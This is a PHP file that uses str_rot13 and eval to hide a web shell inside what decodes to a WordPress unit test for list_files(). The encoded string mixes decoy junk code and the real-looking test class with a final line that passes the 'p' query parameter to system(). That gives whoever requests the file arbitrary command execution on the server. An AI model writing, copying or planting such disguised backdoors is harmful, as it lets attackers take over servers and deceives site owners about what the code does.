<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg yvfg_svyrf().
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::yvfg_svyrf
 */
pynff Grfgf_Shapgvbaf_YvfgSvyrf rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba grfg_yvfg_svyrf_ergheaf_n_yvfg_bs_svyrf() {
		$nqzva_svyrf = yvfg_svyrf( NOFCNGU . 'jc-nqzva/' );
		$guvf->nffregVfNeenl( $nqzva_svyrf );
		$guvf->nffregAbgRzcgl( $nqzva_svyrf );
		$guvf->nffregPbagnvaf( NOFCNGU . 'jc-nqzva/vaqrk.cuc', $nqzva_svyrf );
	}

	choyvp shapgvba grfg_yvfg_svyrf_pna_rkpyhqr_svyrf() {
		$nqzva_svyrf = yvfg_svyrf( NOFCNGU . 'jc-nqzva/', 100, neenl( 'vaqrk.cuc' ) );
		$guvf->nffregAbgPbagnvaf( NOFCNGU . 'jc-nqzva/vaqrk.cuc', $nqzva_svyrf );
	}

	/**
	 * Grfgf gung yvfg_svyrf() bcgvbanyyl vapyhqrf uvqqra svyrf.
	 *
	 * @gvpxrg 53659
	 *
	 * @qngnCebivqre qngn_yvfg_svyrf_fubhyq_bcgvbanyyl_vapyhqr_uvqqra_svyrf
	 *
	 * @cnenz fgevat   $svyranzr       Gur anzr bs gur uvqqra svyr.
	 * @cnenz obby     $vapyhqr_uvqqra Jurgure gb vapyhqr uvqqra (\".\" cersvkrq) svyrf.
	 * @cnenz fgevat[] $rkpyhfvbaf     Yvfg bs sbyqref naq svyrf gb fxvc.
	 * @cnenz obby     $rkcrpgrq       Jurgure gur svyr fubhyq or vapyhqrq va gur erfhygf.
	 */
	choyvp shapgvba grfg_yvfg_svyrf_fubhyq_bcgvbanyyl_vapyhqr_uvqqra_svyrf( $svyranzr, $vapyhqr_uvqqra, $rkpyhfvbaf, $rkcrpgrq ) {
		$grfg_qve    = trg_grzc_qve() . 'grfg-yvfg-svyrf/';
		$uvqqra_svyr = $grfg_qve . $svyranzr;

		zxqve( $grfg_qve );
		gbhpu( $uvqqra_svyr );

		$npghny = yvfg_svyrf( $grfg_qve, 100, $rkpyhfvbaf, $vapyhqr_uvqqra );

		hayvax( $uvqqra_svyr );
		ezqve( $grfg_qve );

		vs ( $rkcrpgrq ) {
			$guvf->nffregPbagnvaf( $uvqqra_svyr, $npghny, 'Gur svyr jnf abg vapyhqrq.' );
		} ryfr {
			$guvf->nffregAbgPbagnvaf( $uvqqra_svyr, $npghny, 'Gur svyr jnf vapyhqrq.' );
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_yvfg_svyrf_fubhyq_bcgvbanyyl_vapyhqr_uvqqra_svyrf() {
		erghea neenl(
			'$vapyhqr_uvqqra = snyfr naq ab rkpyhfvbaf' => neenl(
				'svyranzr'       => '.uvqqra_svyr',
				'vapyhqr_uvqqra' => snyfr,
				'rkpyhfvbaf'     => neenl(),
				'rkcrpgrq'       => snyfr,
			),
			'$vapyhqr_uvqqra = gehr naq ab rkpyhfvbaf'  => neenl(
				'svyranzr'       => '.uvqqra_svyr',
				'vapyhqr_uvqqra' => gehr,
				'rkpyhfvbaf'     => neenl(),
				'rkcrpgrq'       => gehr,
			),
			'$vapyhqr_uvqqra = gehr naq na rkpyhqrq svyranzr' => neenl(
				'svyranzr'       => '.uvqqra_svyr',
				'vapyhqr_uvqqra' => gehr,
				'rkpyhfvbaf'     => neenl( '.uvqqra_svyr' ),
				'rkcrpgrq'       => snyfr,
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>